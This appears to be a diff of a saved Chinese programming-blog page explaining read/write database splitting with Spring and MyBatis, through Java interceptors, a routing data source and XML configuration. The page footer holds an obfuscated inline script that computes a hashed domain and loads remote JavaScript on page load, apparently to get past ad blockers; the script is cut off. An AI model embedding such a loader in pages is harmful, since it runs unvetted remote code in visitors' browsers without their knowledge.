+  if((currValue + 1) &gt;= MAX_POOL) {
+  try {
+   lock.lock();
+   if((currValue + 1) &gt;= MAX_POOL) {
+   counter.set(0);
+   }
+  } finally {
+   lock.unlock();
+  }
+  }
+  index = (int) (currValue % getReadDsSize());
+ } else {
+  //随机方式
+  index = ThreadLocalRandom.current().nextInt(0, getReadDsSize());
+ }
+ return getResolvedReadDataSources().get(index);
+ }
+}</code></pre> 
+<pre class="has"><code class="language-java">import org.apache.ibatis.executor.statement.RoutingStatementHandler;
+import org.apache.ibatis.executor.statement.StatementHandler;
+import org.apache.ibatis.mapping.MappedStatement;
+import org.apache.ibatis.mapping.SqlCommandType;
+import org.apache.ibatis.plugin.*;
+import java.sql.Connection;
+import java.util.Properties;
+/**
+ * 拦截器
+ */
+@Intercepts({ @Signature(type = StatementHandler.class, method = "prepare", args = { Connection.class }) })
+public class DynamicPlugin implements Interceptor {
+ public Object intercept(Invocation invocation) throws Throwable {
+ Connection conn = (Connection)invocation.getArgs()[0];
+ //如果是采用了我们代理,则路由数据源
+ if(conn instanceof com.autohome.api.dealer.tuan.dao.rwmybatis.ConnectionProxy){
+  StatementHandler statementHandler = (StatementHandler) invocation
+   .getTarget();
+  MappedStatement mappedStatement = null;
+  if (statementHandler instanceof RoutingStatementHandler) {
+  StatementHandler delegate = (StatementHandler) ReflectionUtils
+   .getFieldValue(statementHandler, "delegate");
+  mappedStatement = (MappedStatement) ReflectionUtils.getFieldValue(
+   delegate, "mappedStatement");
+  } else {
+  mappedStatement = (MappedStatement) ReflectionUtils.getFieldValue(
+statementHandler, "mappedStatement");
+  }
+  String key = AbstractDynamicDataSourceProxy.WRITE;
+  if(mappedStatement.getSqlCommandType() == SqlCommandType.SELECT){
+  key = AbstractDynamicDataSourceProxy.READ;
+  }else{
+  key = AbstractDynamicDataSourceProxy.WRITE;
+  }
+  ConnectionProxy connectionProxy = (ConnectionProxy)conn;
+  connectionProxy.getTargetConnection(key);
+ }
+ return invocation.proceed();
+ }
+ public Object plugin(Object target) {
+ return Plugin.wrap(target, this);
+ }
+ public void setProperties(Properties properties) {
+ //NOOP
+ }
+}</code></pre> 
+<pre class="has"><code class="language-java">import org.apache.ibatis.logging.Log;
+import org.apache.ibatis.logging.LogFactory;
+import java.lang.reflect.*;
+public class ReflectionUtils {
+ private static final Log logger = LogFactory.getLog(ReflectionUtils.class);
+ /**
+ * 直接设置对象属性值,无视private/protected修饰符,不经过setter函数.
+ */
+ public static void setFieldValue(final Object object, final String fieldName, final Object value) {
+ Field field = getDeclaredField(object, fieldName);
+ if (field == null)
+  throw new IllegalArgumentException("Could not find field [" + fieldName + "] on target [" + object + "]");
+ makeAccessible(field);
+ try {
+  field.set(object, value);
+ } catch (IllegalAccessException e) {
+ }
+ }
+ /**
+ * 直接读取对象属性值,无视private/protected修饰符,不经过getter函数.
+ */
+ public static Object getFieldValue(final Object object, final String fieldName) {
+ Field field = getDeclaredField(object, fieldName);
+ if (field == null)
+  throw new IllegalArgumentException("Could not find field [" + fieldName + "] on target [" + object + "]");
+ makeAccessible(field);
+ Object result = null;
+ try {
+  result = field.get(object);
+ } catch (IllegalAccessException e) {
+ }
+ return result;
+ }
+ /**
+ * 直接调用对象方法,无视private/protected修饰符.
+ */
+ public static Object invokeMethod(final Object object, final String methodName, final Class&lt;?&gt;[] parameterTypes,
+  final Object[] parameters) throws InvocationTargetException {
+ Method method = getDeclaredMethod(object, methodName, parameterTypes);
+ if (method == null)
+  throw new IllegalArgumentException("Could not find method [" + methodName + "] on target [" + object + "]");
+ method.setAccessible(true);
+ try {
+  return method.invoke(object, parameters);
+ } catch (IllegalAccessException e) {
+ }
+ return null;
+ }
+ /**
+ * 循环向上转型,获取对象的DeclaredField.
+ */
+ protected static Field getDeclaredField(final Object object, final String fieldName) {
+ for (Class&lt;?&gt; superClass = object.getClass(); superClass != Object.class; superClass = superClass
+  .getSuperclass()) {
+  try {
+  return superClass.getDeclaredField(fieldName);
+  } catch (NoSuchFieldException e) {
+  }
+ }
+ return null;
+ }
+ /**
+ * 循环向上转型,获取对象的DeclaredField.
+ */
+ protected static void makeAccessible(final Field field) {
+ if (!Modifier.isPublic(field.getModifiers()) || !Modifier.isPublic(field.getDeclaringClass().getModifiers())) {
+  field.setAccessible(true);
+ }
+ }
+ /**
+ * 循环向上转型,获取对象的DeclaredMethod.
+ */
+ protected static Method getDeclaredMethod(Object object, String methodName, Class&lt;?&gt;[] parameterTypes) {
+ for (Class&lt;?&gt; superClass = object.getClass(); superClass != Object.class; superClass = superClass
+  .getSuperclass()) {
+  try {
+  return superClass.getDeclaredMethod(methodName, parameterTypes);
+  } catch (NoSuchMethodException e) {
+  }
+ }
+ return null;
+ }
+ /**
+ * 通过反射,获得Class定义中声明的父类的泛型参数的类型.
+ * eg.
+ * public UserDao extends HibernateDao&lt;User&gt;
+ *
+ * @param clazz The class to introspect
+ * @return the first generic declaration, or Object.class if cannot be determined
+ */
+ @SuppressWarnings("unchecked")
+ public static &lt;T&gt; Class&lt;T&gt; getSuperClassGenricType(final Class clazz) {
+ return getSuperClassGenricType(clazz, 0);
+ }
+ /**
+ * 通过反射,获得Class定义中声明的父类的泛型参数的类型.
+ * eg.
+ * public UserDao extends HibernateDao&lt;User&gt;
+ *
+ * @param clazz The class to introspect
+ * @return the first generic declaration, or Object.class if cannot be determined
+ */
+ @SuppressWarnings("unchecked")
+ public static Class getSuperClassGenricType(final Class clazz, final int index) {
+ Type genType = clazz.getGenericSuperclass();
+ if (!(genType instanceof ParameterizedType)) {
+  logger.warn(clazz.getSimpleName() + "'s superclass not ParameterizedType");
+  return Object.class;
+ }
+ Type[] params = ((ParameterizedType) genType).getActualTypeArguments();
+ if (index &gt;= params.length || index &lt; 0) {
+  logger.warn("Index: " + index + ", Size of " + clazz.getSimpleName() + "'s Parameterized Type: "
+   + params.length);
+  return Object.class;
+ }
+ if (!(params[index] instanceof Class)) {
+  logger.warn(clazz.getSimpleName() + " not set the actual class on superclass generic parameter");
+  return Object.class;
+ }
+ return (Class) params[index];
+ }
+ /**
+ * 将反射时的checked exception转换为unchecked exception.
+ */
+ public static IllegalArgumentException convertToUncheckedException(Exception e) {
+ if (e instanceof IllegalAccessException || e instanceof IllegalArgumentException
+  || e instanceof NoSuchMethodException)
+  return new IllegalArgumentException("Refelction Exception.", e);
+ else
+  return new IllegalArgumentException(e);
+ }
+}</code></pre> 
+<pre class="has"><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD SQL Map Config 3.0//EN" 
+ "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;
+&lt;configuration&gt;
+ &lt;plugins&gt;
+  &lt;plugin interceptor="com.test.api.dao.mybatis.DynamicPlugin"&gt;
+  &lt;/plugin&gt;
+ &lt;/plugins&gt;
+&lt;/configuration&gt;</code></pre> 
+<pre class="has"><code class="language-html">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;beans xmlns="http://www.springframework.org/schema/beans"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:tx="http://www.springframework.org/schema/tx"
+xmlns:aop="http://www.springframework.org/schema/aop"
+xsi:schemaLocation="http://www.springframework.org/schema/beans  http://www.springframework.org/schema/beans/spring-beans-4.1.xsd
+http://www.springframework.org/schema/tx
+http://www.springframework.org/schema/tx/spring-tx-4.1.xsd
+http://www.springframework.org/schema/aop  http://www.springframework.org/schema/aop/spring-aop-4.1.xsd"&gt;
+ &lt;bean id="abstractDataSource" abstract="true" class="com.alibaba.druid.pool.DruidDataSource" init-method="init" destroy-method="close"&gt;
+  &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+  &lt;!-- 配置获取连接等待超时的时间 --&gt;
+  &lt;property name="maxWait" value="60000"/&gt;
+  &lt;!-- 配置间隔多久才进行一次检测，检测需要关闭的空闲连接，单位是毫秒 --&gt;
+  &lt;property name="timeBetweenEvictionRunsMillis" value="60000"/&gt;
+  &lt;!-- 配置一个连接在池中最小生存的时间，单位是毫秒 --&gt;
+  &lt;property name="minEvictableIdleTimeMillis" value="300000"/&gt;
+  &lt;property name="validationQuery" value="SELECT 'x'"/&gt;
+  &lt;property name="testWhileIdle" value="true"/&gt;
+  &lt;property name="testOnBorrow" value="false"/&gt;
+  &lt;property name="testOnReturn" value="false"/&gt;
+  &lt;!-- 打开PSCache，并且指定每个连接上PSCache的大小 --&gt;
+  &lt;property name="poolPreparedStatements" value="true"/&gt;
+  &lt;property name="maxPoolPreparedStatementPerConnectionSize" value="20"/&gt;
+  &lt;property name="filters" value="config"/&gt;
+  &lt;property name="connectionProperties" value="config.decrypt=true" /&gt;
+ &lt;/bean&gt;
+ &lt;bean id="dataSourceRead1" parent="abstractDataSource"&gt;
+  &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+  &lt;!-- 基本属性 url、user、password --&gt;
+  &lt;property name="url" value="${read1.jdbc.url}"/&gt;
+  &lt;property name="username" value="${read1.jdbc.user}"/&gt;
+  &lt;property name="password" value="${read1.jdbc.password}"/&gt;
+  &lt;!-- 配置初始化大小、最小、最大 --&gt;
+  &lt;property name="initialSize" value="${read1.jdbc.initPoolSize}"/&gt;
+  &lt;property name="minIdle" value="${read1.jdbc.minPoolSize}"/&gt;
+  &lt;property name="maxActive" value="${read1.jdbc.maxPoolSize}"/&gt;
+ &lt;/bean&gt;
+ &lt;bean id="dataSourceRead2" parent="abstractDataSource"&gt;
+  &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+  &lt;!-- 基本属性 url、user、password --&gt;
+  &lt;property name="url" value="${read2.jdbc.url}"/&gt;
+  &lt;property name="username" value="${read2.jdbc.user}"/&gt;
+  &lt;property name="password" value="${read2.jdbc.password}"/&gt;
+  &lt;!-- 配置初始化大小、最小、最大 --&gt;
+  &lt;property name="initialSize" value="${read2.jdbc.initPoolSize}"/&gt;
+  &lt;property name="minIdle" value="${read2.jdbc.minPoolSize}"/&gt;
+  &lt;property name="maxActive" value="${read2.jdbc.maxPoolSize}"/&gt;
+ &lt;/bean&gt;
+ &lt;bean id="dataSourceWrite" parent="abstractDataSource"&gt;
+  &lt;property name="driverClassName" value="com.microsoft.sqlserver.jdbc.SQLServerDriver"/&gt;
+  &lt;!-- 基本属性 url、user、password --&gt;
+  &lt;property name="url" value="${write.jdbc.url}"/&gt;
+  &lt;property name="username" value="${write.jdbc.user}"/&gt;
+  &lt;property name="password" value="${write.jdbc.password}"/&gt;
+  &lt;!-- 配置初始化大小、最小、最大 --&gt;
+  &lt;property name="initialSize" value="${write.jdbc.initPoolSize}"/&gt;
+  &lt;property name="minIdle" value="${write.jdbc.minPoolSize}"/&gt;
+  &lt;property name="maxActive" value="${write.jdbc.maxPoolSize}"/&gt;
+ &lt;/bean&gt;
+ &lt;bean id="dataSource" class="com.test.api.dao.datasource.DynamicRoutingDataSourceProxy"&gt;
+  &lt;property name="writeDataSource" ref="dataSourceWrite" /&gt;
+  &lt;property name="readDataSources"&gt;
+   &lt;list&gt;
+    &lt;ref bean="dataSourceRead1" /&gt;
+    &lt;ref bean="dataSourceRead2" /&gt;
+   &lt;/list&gt;
+  &lt;/property&gt;
+  &lt;!--轮询方式--&gt;
+  &lt;property name="readDataSourcePollPattern" value="1" /&gt;
+ &lt;/bean&gt;
+ &lt;tx:annotation-driven transaction-manager="transactionManager"/&gt;
+ &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt;
+  &lt;property name="dataSource" ref="dataSource"/&gt;
+ &lt;/bean&gt;
+ &lt;!-- 针对myBatis的配置项 --&gt;
+ &lt;!-- 配置sqlSessionFactory --&gt;
+ &lt;bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt;
+  &lt;!-- 实例化sqlSessionFactory时需要使用上述配置好的数据源以及SQL映射文件 --&gt;
+  &lt;property name="dataSource" ref="dataSource"/&gt;
+  &lt;property name="mapperLocations" value="classpath:mapper/*.xml"/&gt;
+  &lt;property name="configLocation" value="classpath:mybatis-plugin-config.xml" /&gt;
+ &lt;/bean&gt;
+ &lt;bean id="sqlSessionTemplate" class="org.mybatis.spring.SqlSessionTemplate"&gt;
+  &lt;constructor-arg ref="sqlSessionFactory" /&gt;
+ &lt;/bean&gt;
+ &lt;!-- 通过扫描的模式，扫描目录下所有的mapper， 根据对应的mapper.xml为其生成代理类--&gt;
+ &lt;bean id="mapper" class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt;
+  &lt;property name="basePackage" value="com.test.api.dao.inte" /&gt;
+  &lt;property name="sqlSessionTemplate" ref="sqlSessionTemplate"&gt;&lt;/property&gt;
+ &lt;/bean&gt;
+&lt;/beans&gt;</code></pre> 
+<h3>方案4</h3> 
+<p>如果你的后台结构是spring+mybatis，可以通过spring的AbstractRoutingDataSource和mybatis Plugin拦截器实现非常友好的读写分离，原有代码不需要任何改变。推荐第四种方案</p> 
+<pre class="has"><code class="language-java">import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;
+import java.util.HashMap;
+import java.util.Map;
+/**
+ * Created by IDEA
+ * User: mashaohua
+ * Date: 2016-07-14 10:56
+ * Desc: 动态数据源实现读写分离
+ */
+public class DynamicDataSource extends AbstractRoutingDataSource {
+ private Object writeDataSource; //写数据源
+ private Object readDataSource; //读数据源
+ @Override
+ public void afterPropertiesSet() {
+  if (this.writeDataSource == null) {
+   throw new IllegalArgumentException("Property 'writeDataSource' is required");
+  }
+  setDefaultTargetDataSource(writeDataSource);
+  Map&lt;Object, Object&gt; targetDataSources = new HashMap&lt;&gt;();
+  targetDataSources.put(DynamicDataSourceGlobal.WRITE.name(), writeDataSource);
+  if(readDataSource != null) {
+   targetDataSources.put(DynamicDataSourceGlobal.READ.name(), readDataSource);
+  }
+  setTargetDataSources(targetDataSources);
+  super.afterPropertiesSet();
+ }
+ @Override
+ protected Object determineCurrentLookupKey() {
+  DynamicDataSourceGlobal dynamicDataSourceGlobal = DynamicDataSourceHolder.getDataSource();
+  if(dynamicDataSourceGlobal == null
+    || dynamicDataSourceGlobal == DynamicDataSourceGlobal.WRITE) {
+   return DynamicDataSourceGlobal.WRITE.name();
+  }
+  return DynamicDataSourceGlobal.READ.name();
+ }
+ public void setWriteDataSource(Object writeDataSource) {
+  this.writeDataSource = writeDataSource;
+ }
+ public Object getWriteDataSource() {
+  return writeDataSource;
+ }
+ public Object getReadDataSource() {
+  return readDataSource;
+ }
+ public void setReadDataSource(Object readDataSource) {
+  this.readDataSource = readDataSource;
+ }
+}</code></pre> 
+<pre class="has"><code class="language-java">/**
+ * Created by IDEA
+ * User: mashaohua
+ * Date: 2016-07-14 10:58
+ * Desc:
+ */
+public enum DynamicDataSourceGlobal {
+ READ, WRITE;
+}</code></pre> 
+<pre class="has"><code class="language-java">public final class DynamicDataSourceHolder {
+ private static final ThreadLocal&lt;DynamicDataSourceGlobal&gt; holder = new ThreadLocal&lt;DynamicDataSourceGlobal&gt;();
+ private DynamicDataSourceHolder() {
+  //
+ }
+ public static void putDataSource(DynamicDataSourceGlobal dataSource){
+  holder.set(dataSource);
+ }
+ public static DynamicDataSourceGlobal getDataSource(){
+  return holder.get();
+ }
+ public static void clearDataSource() {
+  holder.remove();
+ }
+}</code></pre> 
+<pre class="has"><code class="language-java">import org.apache.ibatis.executor.Executor;
+import org.apache.ibatis.executor.keygen.SelectKeyGenerator;
+import org.apache.ibatis.mapping.BoundSql;
+import org.apache.ibatis.mapping.MappedStatement;
+import org.apache.ibatis.mapping.SqlCommandType;
+import org.apache.ibatis.plugin.*;
+import org.apache.ibatis.session.ResultHandler;
+import org.apache.ibatis.session.RowBounds;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+import org.springframework.transaction.support.TransactionSynchronizationManager;
+import java.util.Locale;
+import java.util.Map;
+import java.util.Properties;
+import java.util.concurrent.ConcurrentHashMap;
+/**
+ * Created by IDEA
+ * User: mashaohua
+ * Date: 2016-08-10 11:09
+ * Desc:
+ */
+@Intercepts({
+@Signature(type = Executor.class, method = "update", args = {
+  MappedStatement.class, Object.class }),
+@Signature(type = Executor.class, method = "query", args = {
+  MappedStatement.class, Object.class, RowBounds.class,
+  ResultHandler.class }) })
+public class DynamicPlugin implements Interceptor {
+ protected static final Logger logger = LoggerFactory.getLogger(DynamicPlugin.class);
+ private static final String REGEX = ".*insert\\u0020.*|.*delete\\u0020.*|.*update\\u0020.*";
+ private static final Map&lt;String, DynamicDataSourceGlobal&gt; cacheMap = new ConcurrentHashMap&lt;&gt;();
+ @Override
+ public Object intercept(Invocation invocation) throws Throwable {
+  boolean synchronizationActive = TransactionSynchronizationManager.isSynchronizationActive();
+  if(!synchronizationActive) {
+   Object[] objects = invocation.getArgs();
+   MappedStatement ms = (MappedStatement) objects[0];
+   DynamicDataSourceGlobal dynamicDataSourceGlobal = null;
+   if((dynamicDataSourceGlobal = cacheMap.get(ms.getId())) == null) {
+    //读方法
+    if(ms.getSqlCommandType().equals(SqlCommandType.SELECT)) {
+     //!selectKey 为自增id查询主键(SELECT LAST_INSERT_ID() )方法，使用主库
+     if(ms.getId().contains(SelectKeyGenerator.SELECT_KEY_SUFFIX)) {
+      dynamicDataSourceGlobal = DynamicDataSourceGlobal.WRITE;
+     } else {
+      BoundSql boundSql = ms.getSqlSource().getBoundSql(objects[1]);
+      String sql = boundSql.getSql().toLowerCase(Locale.CHINA).replaceAll("[\\t\\n\\r]", " ");
+      if(sql.matches(REGEX)) {
+       dynamicDataSourceGlobal = DynamicDataSourceGlobal.WRITE;
+      } else {
+       dynamicDataSourceGlobal = DynamicDataSourceGlobal.READ;
+      }
+     }
+    }else{
+     dynamicDataSourceGlobal = DynamicDataSourceGlobal.WRITE;
+    }
+    logger.warn("设置方法[{}] use [{}] Strategy, SqlCommandType [{}]..", ms.getId(), dynamicDataSourceGlobal.name(), ms.getSqlCommandType().name());
+    cacheMap.put(ms.getId(), dynamicDataSourceGlobal);
+   }
+   DynamicDataSourceHolder.putDataSource(dynamicDataSourceGlobal);
+  }
+  return invocation.proceed();
+ }
+ @Override
+ public Object plugin(Object target) {
+  if (target instanceof Executor) {
+   return Plugin.wrap(target, this);
+  } else {
+   return target;
+  }
+ }
+ @Override
+ public void setProperties(Properties properties) {
+  //
+ }
+}</code></pre> 
+<p> </p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/6a845a2d07b90928b580f5b1d9bd3271/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">JAVA 中protected 修饰符 的作用</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/cdc8d969c3e9eb8547ea0400a3670083/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">xorg-xserver相关完全解析</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程爱好者博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var 